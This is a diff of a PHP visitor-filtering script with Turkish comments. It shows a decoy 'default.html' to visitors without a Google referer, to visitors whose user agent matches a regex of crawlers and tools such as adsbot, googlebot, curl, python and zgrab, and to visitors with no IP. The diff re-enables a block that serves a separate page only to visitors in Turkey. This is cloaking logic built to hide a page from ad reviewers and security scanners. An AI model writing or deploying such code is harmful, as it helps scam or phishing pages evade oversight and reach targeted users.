@@ -37,10 +37,7 @@ $isDisallowedVisitor =
         (empty($ziyaretcireferer) || strpos($ziyaretcireferer, 'https://www.google.com/') === false) || // referer kontrolü
         preg_match('/google|googlebot|expanse|x11|adsbot|adwords|ucbrowser|python|webtech|creatives|compatible|zgrab|curl|macintosh|spider|crawler|mediapartners|apac|none|info|yandex|bing|tiktok|twitter|facebook|sql|slurp|duckduckbot|baiduspider|yandexbot|windows|whatsapp|telegram|colly|java|discord/', strtolower($ziyaretciuseragent)) || // user agent kontrolü
         (trim($ziyaretciuseragent) === '' || stripos($ziyaretciuseragent, 'unknown') !== false || stripos($ziyaretciuseragent, 'bilinmiyor') !== false) || // user agent boşsa veya "unknown" veya "bilinmiyor" içeriyorsa
-        empty($ziyaretciip) || trim($ziyaretciip) === '' || // ziyaretçi IP boş ise veya boşluk karakteri var ise
-        filter_var($ziyaretciip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) || // IPv6 ise
-        (empty($os) || $type == 'robot' || empty($osVersion) || empty($osFamily)); // Yeni boş kontrol
-        // Eğer izin verilmeyen ziyaretçi ise YouTube iframe göster ve işlemi bitir
+        empty($ziyaretciip) || trim($ziyaretciip) === '';
 if ($isDisallowedVisitor) {
         include 'default.html'; // proxy.php sayfasını doğrudan ekleyin
         echo "<script type='text/javascript'>";
@@ -49,7 +46,6 @@ if ($isDisallowedVisitor) {
         exit; // Diğer kontrol bloklarına geçmeden script'i sonlandır
 }
 
-/*
 // İkinci kontrol grubu - izin verilen ziyaretçi
 $isAllowedVisitor = 
     $ipDetails['country'] === 'TR' &&
@@ -66,7 +62,7 @@ if ($isAllowedVisitor)
 {
   include 'ziyaretci.html'; // proxy.php sayfasını doğrudan ekleyin
 }
-*/
+
 else {
         include 'default.html'; // proxy.php sayfasını doğrudan ekleyin
         echo "<script type='text/javascript'>";
